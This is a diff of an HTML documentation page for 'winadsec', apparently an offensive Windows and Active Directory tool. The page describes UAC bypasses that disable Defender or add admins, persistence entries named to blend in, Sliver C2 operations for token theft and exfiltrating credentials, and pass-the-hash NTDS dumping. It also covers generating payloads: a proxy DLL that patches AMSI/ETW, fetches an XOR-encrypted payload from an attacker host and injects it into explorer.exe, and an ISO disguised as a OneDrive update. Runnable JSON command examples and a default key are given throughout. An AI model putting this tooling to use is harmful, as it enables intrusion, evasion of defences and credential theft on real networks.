+        <h2>Post-exploitation</h2>
+
+        <h3>uac_bypass</h3>
+        <p>Writes a payload command to a HKCU protocol handler key via PowerShell <code>-EncodedCommand</code> (delivered through WMI exec), then triggers an auto-elevating Windows binary. The elevated process runs the payload at high integrity. Registry cleanup happens automatically after execution.</p>
+
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>uac_method</th><th>Registry key</th><th>Trigger binary</th><th>Notes</th></tr></thead>
+            <tbody>
+              <tr><td><code>fodhelper</code></td><td>HKCU\...\ms-settings\shell\open\command</td><td>fodhelper.exe</td><td>Default. Requires DelegateExecute="". Win10 / Win11.</td></tr>
+              <tr><td><code>eventvwr</code></td><td>HKCU\...\mscfile\shell\open\command</td><td>eventvwr.exe</td><td>Fallback. No DelegateExecute needed. Older builds.</td></tr>
+              <tr><td><code>wsreset</code></td><td>HKCU\...\AppX82…\Shell\open\command</td><td>wsreset.exe</td><td>UWP path. Newer Win11 builds. Needs UWP present.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>uac_payload</th><th>Effect</th></tr></thead>
+            <tbody>
+              <tr><td><code>lsa_fix</code></td><td>Set HKLM LimitBlankPasswordUse=0 — enables blank-password SMB authentication</td></tr>
+              <tr><td><code>add_admin</code></td><td>Add current user to the local Administrators group</td></tr>
+              <tr><td><code>disable_defender</code></td><td>Set-MpPreference -DisableRealtimeMonitoring $true</td></tr>
+              <tr><td><code>enable_rdp</code></td><td>Set fDenyTSConnections=0 in HKLM — opens RDP port 3389</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>lsa_fix</h3>
+        <p>Shortcut for <code>uac_bypass</code> with <code>uac_payload=lsa_fix</code>. Disables <code>LimitBlankPasswordUse</code> via UAC-elevated <code>reg.exe add</code>. Verifies the write succeeded and returns <code>bypassed: true/false</code> in the JSON result.</p>
+      </section>
+
+      <!-- Persistence -->
+      <section id="persist">
+        <p class="sec-label">Operations</p>
+        <h2>Persistence</h2>
+        <p>All methods survive reboot and shutdown. Install with <code>operation: persistence</code>, remove with <code>remove: true</code>. Use <code>persist_name</code> to blend in (e.g. <code>WindowsSecurityHealth</code>, <code>MicrosoftUpdateHelper</code>).</p>
+
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>persist_method</th><th>Privilege</th><th>Trigger</th><th>Stealth</th><th>Notes</th></tr></thead>
+            <tbody>
+              <tr>
+                <td><code>run_key</code></td>
+                <td><span class="sev sev-low">low-priv</span></td>
+                <td>User logon</td>
+                <td>★★☆</td>
+                <td>HKCU\Software\Microsoft\Windows\CurrentVersion\Run. Visible in Autoruns. Default fallback.</td>
+              </tr>
+              <tr>
+                <td><code>startup_folder</code></td>
+                <td><span class="sev sev-low">low-priv</span></td>
+                <td>User logon</td>
+                <td>★☆☆</td>
+                <td>Copies EXE to user Startup folder. Very visible to analysts.</td>
+              </tr>
+              <tr>
+                <td><code>scheduled_task</code></td>
+                <td><span class="sev sev-low">low-priv</span></td>
+                <td>On logon</td>
+                <td>★★☆</td>
+                <td>schtasks /sc onlogon. Visible in Task Scheduler. Survives any user's logon.</td>
+              </tr>
+              <tr>
+                <td><code>service</code></td>
+                <td><span class="sev sev-high">admin</span></td>
+                <td>Boot (pre-logon)</td>
+                <td>★★☆</td>
+                <td>Auto-start service. Fires before any user logs in. Visible in Services snap-in.</td>
+              </tr>
+              <tr>
+                <td><code>wmi_sub</code></td>
+                <td><span class="sev sev-high">admin</span></td>
+                <td>~60s after boot</td>
+                <td><strong>★★★</strong></td>
+                <td>WMI EventFilter + CommandLineEventConsumer. Not shown in Autoruns by default. Hardest to detect and remove.</td>
+              </tr>
+              <tr>
+                <td><code>all_user</code></td>
+                <td><span class="sev sev-high">admin</span></td>
+                <td>Any user logon</td>
+                <td>★★☆</td>
+                <td>HKLM\Software\Microsoft\Windows\CurrentVersion\Run. Fires for every user that logs in.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- Sliver C2 -->
+      <section id="sliver">
+        <p class="sec-label">Operations</p>
+        <h2>Sliver C2 bridge</h2>
+        <p>All Sliver ops use the installed <code>sliver-client</code> binary with operator config auto-loaded from <code>~/.sliver-client/configs/</code>. Single-command ops use <code>implant -s SESSION_ID</code>; multi-step ops write RC script files and run via <code>console --rc</code>.</p>
+
+        <div class="mode-grid">
+          <div class="mode-card">
+            <div class="mode-key">sliver_sessions</div>
+            <div class="mode-desc">List all active sessions: ID, name, transport, remote address, hostname, username, OS.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">sliver_exec</div>
+            <div class="mode-desc">Execute shell command via <code>cmd.exe /Q /c</code> on the implant. Returns stdout and stderr combined.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">sliver_upload</div>
+            <div class="mode-desc">Upload a local file to a remote path. Used to deliver payloads, scripts, and auxiliary tools.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">sliver_download</div>
+            <div class="mode-desc">Download a remote file to a local path. Used to exfiltrate loot, creds, and configs.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">sliver_ps</div>
+            <div class="mode-desc">List remote processes with PID, PPID, process name, owner. Identify injection and impersonation targets.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">sliver_spawndll</div>
+            <div class="mode-desc">Reflective DLL injection into a target PID. Primary delivery path for UAC bypass DLLs.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">sliver_getsystem</div>
+            <div class="mode-desc">Escalate to NT AUTHORITY\SYSTEM via Sliver built-in. Requires a high-integrity session.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">sliver_registry</div>
+            <div class="mode-desc">Read or write Windows registry values. Omit <code>reg_value</code> to read; provide it to write. Supports string, DWORD, binary.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">sliver_whoami</div>
+            <div class="mode-desc">Return current user and integrity level via <code>whoami /groups</code>. Confirms UAC bypass success.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">sliver_screenshot</div>
+            <div class="mode-desc">Capture a desktop screenshot, save to <code>output_dir</code> with timestamp filename.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">sliver_impersonate</div>
+            <div class="mode-desc">Steal the token of a logged-in user. Requires SeDebugPrivilege (high-integrity session).</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">sliver_make_token</div>
+            <div class="mode-desc">Create a logon session with given credentials without spawning a new process. Pass-the-Hash compatible.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Payload Gen -->
+      <section id="gen">
+        <p class="sec-label">Operations</p>
+        <h2>Payload generation</h2>
+
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Operation</th><th>Tool</th><th>Output file</th><th>Notes</th></tr></thead>
+            <tbody>
+              <tr><td><code>gen_sliver</code></td><td>sliver-client generate</td><td>WinUpdate.exe</td><td>HTTP implant, garble + evasion flags</td></tr>
+              <tr><td><code>gen_shellcode</code></td><td>donut -f 1 -a 2</td><td>implant.bin</td><td>Raw x64 position-independent shellcode</td></tr>
+              <tr><td><code>gen_payload</code></td><td>Python XOR + struct.pack</td><td>update.bin</td><td>4-byte LE len header + XOR ciphertext</td></tr>
+              <tr><td><code>gen_proxy_dll</code></td><td>zig cc -target x86_64-windows-gnu</td><td>version.dll</td><td>Proxy DLL + AMSI/ETW patch + WinHTTP loader</td></tr>
+              <tr><td><code>gen_uac_dll</code></td><td>zig cc -target x86_64-windows-gnu</td><td>uacbypass.dll</td><td>Reflective DLL for fodhelper COM IShellDispatch2</td></tr>
+              <tr><td><code>gen_iso</code></td><td>xorriso -as mkisofs</td><td>OneDriveUpdate.iso</td><td>Signed EXE + malicious DLL in ISO container</td></tr>
+              <tr><td><code>gen_all</code></td><td>all of the above</td><td>full drop/</td><td>Runs complete chain in sequence</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>XOR key</h3>
+        <p>Default key (hex): <code>4e3a7f1289abcdef0123456789fedcba</code>. Override with the <code>xor_key</code> parameter. The proxy DLL and <code>update.bin</code> must use identical keys — mismatch causes a crash on the remote host.</p>
+
+        <h3>Proxy DLL internals</h3>
+        <p>On <code>DLL_PROCESS_ATTACH</code>: loads the real <code>System32\version.dll</code>, resolves all 17 exports for transparent forwarding, spawns <code>payload_thread</code>. The thread patches <code>AmsiScanBuffer</code> and <code>EtwEventWrite</code> in-process, opens a WinHTTP connection to <code>C2_HOST:C2_PORT/C2_PATH</code>, reads the XOR-encrypted <code>update.bin</code>, decrypts it, and calls <code>VirtualAllocEx + WriteProcessMemory + CreateRemoteThread</code> on <code>explorer.exe</code>. Shellcode survives host-process exit since it runs inside explorer.</p>
+      </section>
+
+      <!-- Parameters -->
+      <section id="params">
+        <p class="sec-label">Reference</p>
+        <h2>Parameters</h2>
+        <p>All parameters go inside the <code>params</code> object in the JSON input, or as <code>set &lt;param&gt; &lt;value&gt;</code> in the secV shell.</p>
+
+        <h3>Core</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Parameter</th><th>Type</th><th>Default</th><th>Description</th></tr></thead>
+            <tbody>
+              <tr><td>operation</td><td>string</td><td><em>required</em></td><td>Operation to run (see all sections above)</td></tr>
+              <tr><td>domain</td><td>string</td><td>""</td><td>NETBIOS or FQDN domain name (e.g. CORP or corp.local)</td></tr>
+              <tr><td>username</td><td>string</td><td>""</td><td>Domain or local username for authentication</td></tr>
+              <tr><td>password</td><td>string</td><td>""</td><td>Password. Blank string "" enables LimitBlankPasswordUse bypass</td></tr>
+              <tr><td>hash</td><td>string</td><td>""</td><td>NT hash for Pass-the-Hash (LM:NT format). Used by secrets, exec, wmiexec.</td></tr>
+              <tr><td>output_dir</td><td>string</td><td>"./output"</td><td>Directory for all output files (loot, payloads, logs)</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>UAC bypass</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Parameter</th><th>Values</th><th>Default</th><th>Description</th></tr></thead>
+            <tbody>
+              <tr><td>uac_method</td><td>fodhelper | eventvwr | wsreset</td><td>fodhelper</td><td>Which auto-elevation binary to abuse</td></tr>
+              <tr><td>uac_payload</td><td>lsa_fix | add_admin | disable_defender | enable_rdp</td><td>lsa_fix</td><td>Action to perform at high integrity</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Persistence</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Parameter</th><th>Values</th><th>Default</th><th>Description</th></tr></thead>
+            <tbody>
+              <tr><td>persist_method</td><td>run_key | startup_folder | scheduled_task | service | wmi_sub | all_user</td><td>run_key</td><td>Persistence mechanism to install/remove</td></tr>
+              <tr><td>persist_name</td><td>string</td><td>WindowsUpdate</td><td>Name to register the persistence under (blend in)</td></tr>
+              <tr><td>exe</td><td>path string</td><td>""</td><td>Remote path of the EXE to persist (e.g. C:\Windows\Temp\svcx.exe)</td></tr>
+              <tr><td>remove</td><td>true | false</td><td>false</td><td>If true, removes the named persistence entry instead of installing</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Sliver C2</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Parameter</th><th>Type</th><th>Description</th></tr></thead>
+            <tbody>
+              <tr><td>session_id</td><td>string</td><td>Sliver session ID (from sliver_sessions). Required for most sliver_* ops.</td></tr>
+              <tr><td>dll_path</td><td>string</td><td>Local path to the DLL for sliver_spawndll injection</td></tr>
+              <tr><td>pid</td><td>integer</td><td>Target PID for sliver_spawndll injection</td></tr>
+              <tr><td>hive</td><td>HKCU | HKLM | HKEY_…</td><td>Registry hive for sliver_registry operations</td></tr>
+              <tr><td>reg_key</td><td>string</td><td>Registry key path (e.g. Software\Microsoft\Windows\CurrentVersion\Run)</td></tr>
+              <tr><td>reg_name</td><td>string</td><td>Registry value name</td></tr>
+              <tr><td>reg_value</td><td>string</td><td>Registry value data (omit to read; provide to write)</td></tr>
+              <tr><td>reg_type</td><td>string | dword | binary</td><td>Registry value type for write operations (default: string)</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Payload generation</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Parameter</th><th>Type</th><th>Default</th><th>Description</th></tr></thead>
+            <tbody>
+              <tr><td>c2_host</td><td>string</td><td>""</td><td>Attacker IP hosting the encrypted <code>update.bin</code> payload</td></tr>
+              <tr><td>c2_port</td><td>integer</td><td>9000</td><td>HTTP port serving the payload file</td></tr>
+              <tr><td>c2_http_port</td><td>integer</td><td>8443</td><td>Sliver server HTTPS listener port (for gen_sliver)</td></tr>
+              <tr><td>sliver_exe</td><td>path string</td><td>"WinUpdate.exe"</td><td>Path to the Sliver implant EXE (input for gen_shellcode)</td></tr>
+              <tr><td>legit_exe</td><td>path string</td><td>""</td><td>Path to a Microsoft-signed EXE to bundle in the ISO</td></tr>
+              <tr><td>xor_key</td><td>hex string</td><td>4e3a7f12…</td><td>16-byte XOR key (hex). Must match key baked into version.dll.</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- Examples -->
+      <section id="examples">
+        <p class="sec-label">Reference</p>
+        <h2>Examples</h2>
+
+        <h3>Full gen_all delivery package</h3>
+        <pre><code>echo '{
   "target": "192.168.1.200",
   "params": {
     "operation":    "gen_all",
@@ -676,8 +1115,8 @@ td code { font-size: 0.7rem; }
   }
 }' | python3 winadsec.py</code></pre>
 
-  <h3>UAC bypass → lsa_fix</h3>
-  <pre><code>echo '{
+        <h3>UAC bypass → lsa_fix (blank password SMB)</h3>
+        <pre><code>echo '{
   "target":  "192.168.1.200",
   "params": {
     "operation":  "lsa_fix",
@@ -687,8 +1126,8 @@ td code { font-size: 0.7rem; }
   }
 }' | python3 winadsec.py</code></pre>
 
-  <h3>WMI persistence (survives reboot)</h3>
-  <pre><code>echo '{
+        <h3>WMI persistence (survives reboot)</h3>
+        <pre><code>echo '{
   "target": "192.168.1.200",
   "params": {
     "operation":      "persistence",
@@ -700,8 +1139,8 @@ td code { font-size: 0.7rem; }
   }
 }' | python3 winadsec.py</code></pre>
 
-  <h3>Sliver spawndll UAC bypass</h3>
-  <pre><code>echo '{
+        <h3>Sliver spawndll — reflective DLL injection</h3>
+        <pre><code>echo '{
   "target": "192.168.1.200",
   "params": {
     "operation":  "sliver_spawndll",
@@ -711,8 +1150,8 @@ td code { font-size: 0.7rem; }
   }
 }' | python3 winadsec.py</code></pre>
 
-  <h3>Full auto assessment</h3>
-  <pre><code>echo '{
+        <h3>Full auto AD assessment</h3>
+        <pre><code>echo '{
   "target": "192.168.1.200",
   "params": {
     "operation":  "auto",
@@ -723,8 +1162,8 @@ td code { font-size: 0.7rem; }
   }
 }' | python3 winadsec.py</code></pre>
 
-  <h3>Pass-the-hash NTDS dump</h3>
-  <pre><code>echo '{
+        <h3>Pass-the-Hash NTDS dump</h3>
+        <pre><code>echo '{
   "target": "192.168.1.200",
   "params": {
     "operation": "secrets",
@@ -734,104 +1173,111 @@ td code { font-size: 0.7rem; }
   }
 }' | python3 winadsec.py</code></pre>
 
-  <h3>Registry write via Sliver</h3>
-  <pre><code>echo '{
+        <h3>Registry write via Sliver</h3>
+        <pre><code>echo '{
   "target": "192.168.1.200",
   "params": {
-    "operation":   "sliver_registry",
-    "session_id":  "a1b2c3d4",
-    "hive":        "HKCU",
-    "reg_key":     "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-    "reg_name":    "WindowsUpdate",
-    "reg_value":   "C:\\Windows\\Temp\\svcx.exe",
-    "reg_type":    "string"
+    "operation":  "sliver_registry",
+    "session_id": "a1b2c3d4",
+    "hive":       "HKCU",
+    "reg_key":    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "reg_name":   "WindowsUpdate",
+    "reg_value":  "C:\\Windows\\Temp\\svcx.exe",
+    "reg_type":   "string"
   }
 }' | python3 winadsec.py</code></pre>
+      </section>
 
-  <!-- Requirements -->
-  <h2 id="requirements">Requirements</h2>
+      <!-- Requirements -->
+      <section id="requirements">
+        <p class="sec-label">Reference</p>
+        <h2>Requirements</h2>
 
-  <div class="table-wrap">
-  <table>
-    <thead><tr><th>Tool</th><th>Required</th><th>Used for</th></tr></thead>
-    <tbody>
-      <tr><td><code>python3</code></td><td>Yes</td><td>Running winadsec</td></tr>
-      <tr><td><code>impacket</code></td><td>Yes</td><td>SMB, LDAP, secretsdump, wmiexec</td></tr>
-      <tr><td><code>sliver-client</code></td><td>Yes (C2 ops)</td><td>All sliver_* operations and payload gen</td></tr>
-      <tr><td><code>zig</code></td><td>Yes (gen ops)</td><td>Cross-compiling version.dll and uacbypass.dll</td></tr>
-      <tr><td><code>donut</code></td><td>Yes (gen ops)</td><td>EXE → shellcode conversion</td></tr>
-      <tr><td><code>xorriso</code></td><td>Yes (gen_iso)</td><td>Building the delivery ISO</td></tr>
-      <tr><td><code>bloodhound-python</code></td><td>Optional</td><td><code>bloodhound</code> operation</td></tr>
-      <tr><td><code>hashcat</code></td><td>Optional</td><td>Offline hash cracking (NTLM, Kerberoast)</td></tr>
-    </tbody>
-  </table>
-  </div>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Tool</th><th>Required for</th><th>Tier</th></tr></thead>
+            <tbody>
+              <tr><td>Python 3.8+</td><td>Running winadsec</td><td>Always</td></tr>
+              <tr><td>impacket</td><td>SMB, LDAP, secretsdump, wmiexec, kerberoast</td><td>Always</td></tr>
+              <tr><td>ldap3</td><td>LDAP enumeration (users, groups, GPP)</td><td>Always</td></tr>
+              <tr><td>dnspython</td><td>DC SRV record resolution</td><td>Always</td></tr>
+              <tr><td>sliver-client</td><td>All sliver_* operations and gen_sliver</td><td>C2 ops</td></tr>
+              <tr><td>zig</td><td>Cross-compiling version.dll and uacbypass.dll</td><td>gen ops</td></tr>
+              <tr><td>donut</td><td>EXE → position-independent shellcode</td><td>gen ops</td></tr>
+              <tr><td>xorriso</td><td>Building the delivery ISO</td><td>gen_iso</td></tr>
+              <tr><td>bloodhound-python</td><td><code>bloodhound</code> operation</td><td>Optional</td></tr>
+              <tr><td>hashcat / john</td><td>Offline crack of NTLM / Kerberoast hashes</td><td>Optional</td></tr>
+            </tbody>
+          </table>
+        </div>
 
-  <h3>Install</h3>
-  <pre><code><span class="cm"># Debian / Ubuntu / Kali</span>
-pip3 install impacket bloodhound
-sudo apt install xorriso
+        <h3>Install</h3>
+        <pre><code><span class="comment"># Python packages</span>
+pip3 install impacket ldap3 dnspython bloodhound
 
-<span class="cm"># Zig (cross-compiler for DLL generation)</span>
+<span class="comment"># Arch / CachyOS / Manjaro</span>
+sudo pacman -S xorriso smbclient
+
+<span class="comment"># Debian / Ubuntu / Kali</span>
+sudo apt install xorriso smbclient rpcclient
+
+<span class="comment"># Fedora / RHEL</span>
+sudo dnf install xorriso samba-client
+
+<span class="comment"># Zig cross-compiler (for DLL generation)</span>
 wget https://ziglang.org/download/0.12.0/zig-linux-x86_64-0.12.0.tar.xz
 tar -xf zig-linux-x86_64-0.12.0.tar.xz
-sudo mv zig-linux-x86_64-0.12.0 /opt/zig && sudo ln -s /opt/zig/zig /usr/local/bin/zig
+sudo mv zig-linux-x86_64-0.12.0 /opt/zig
+sudo ln -s /opt/zig/zig /usr/local/bin/zig
 
-<span class="cm"># donut (shellcode gen)</span>
+<span class="comment"># donut (EXE → shellcode)</span>
 pip3 install donut-shellcode</code></pre>
 
-  <div class="page-footer">
-    <a href="../index.html">← Back to Hub</a>
-    <div style="display:flex;gap:1.5rem;flex-wrap:wrap">
-      <a href="netrecon.html">netrecon →</a>
-      <a href="android_pentest.html">android_pentest →</a>
-      <a href="https://github.com/secvulnhub" target="_blank">GitHub ↗</a>
+        <div class="callout info">
+          <span class="callout-mark">ℹ</span>
+          The secV <code>install.sh</code> at the repo root handles all package installation automatically. Run it once after cloning to get all dependencies for your distro family.
+        </div>
+      </section>
+
+    </div><!-- /content -->
+  </div><!-- /doc-body -->
+</div><!-- /page -->
+
+<footer>
+  <div class="foot-inner">
+    <a class="foot-brand" href="../index.html">SecVulnHub</a>
+    <div class="foot-links">
+      <a class="foot-link" href="netrecon.html">netrecon</a>
+      <a class="foot-link" href="android_pentest.html">android_pentest</a>
+      <a class="foot-link" href="wifi_monitor.html">wifi_monitor</a>
+      <a class="foot-link" href="https://github.com/secvulnhub/SecV" target="_blank">GitHub</a>
     </div>
+    <span class="foot-note">MIT © 2024–2026 SecVulnHub</span>
   </div>
-
-</div>
-</main>
-
-<!-- TOC right rail -->
-<aside class="toc-rail">
-  <span class="toc-title">Contents</span>
-  <a class="toc-item" href="#overview">Overview</a>
-  <a class="toc-item" href="#quickstart">Quickstart</a>
-  <a class="toc-item" href="#chain">Attack Chain</a>
-  <a class="toc-item" href="#assess">Assessment</a>
-  <a class="toc-item" href="#postex">Post-Exploitation</a>
-  <a class="toc-item" href="#persist">Persistence</a>
-  <a class="toc-item" href="#sliver">Sliver C2</a>
-  <a class="toc-item" href="#gen">Payload Gen</a>
-  <a class="toc-item" href="#examples">Examples</a>
-  <a class="toc-item" href="#requirements">Requirements</a>
-</aside>
-
-</div>
+</footer>
 
 <script>
-const burger = document.getElementById('burger');
-const overlay = document.getElementById('overlay');
-burger.addEventListener('click', () => document.body.classList.toggle('menu-open'));
-overlay.addEventListener('click', () => document.body.classList.remove('menu-open'));
+const nav = document.getElementById('nav');
+window.addEventListener('scroll', () => {
+  nav.classList.toggle('scrolled', scrollY > 20);
+}, { passive: true });
 
-const headings = document.querySelectorAll('h2[id]');
-const sideNavItems = document.querySelectorAll('aside.nav-sidebar .nav-item[href^="#"]');
-const tocItems = document.querySelectorAll('aside.toc-rail .toc-item');
-
-function setActive(id) {
-  sideNavItems.forEach(n => n.classList.toggle('active', n.getAttribute('href') === '#' + id));
-  tocItems.forEach(t => t.classList.toggle('active', t.getAttribute('href') === '#' + id));
-}
-
-const obs = new IntersectionObserver(entries => {
-  entries.forEach(e => { if (e.isIntersecting) setActive(e.target.id); });
-}, { rootMargin: '-15% 0px -70% 0px' });
-headings.forEach(h => obs.observe(h));
-
-document.querySelectorAll('aside.nav-sidebar .nav-item').forEach(item => {
-  item.addEventListener('click', () => document.body.classList.remove('menu-open'));
+document.getElementById('burger').addEventListener('click', () => {
+  document.body.classList.toggle('nav-open');
 });
+
+const sections = document.querySelectorAll('.content section[id]');
+const navLinks = document.querySelectorAll('.sidebar-nav a[href^="#"]');
+const obs = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      navLinks.forEach(a => {
+        a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id);
+      });
+    }
+  });
+}, { rootMargin: '-52px 0px -60% 0px' });
+sections.forEach(s => obs.observe(s));
 </script>
 </body>
 </html>
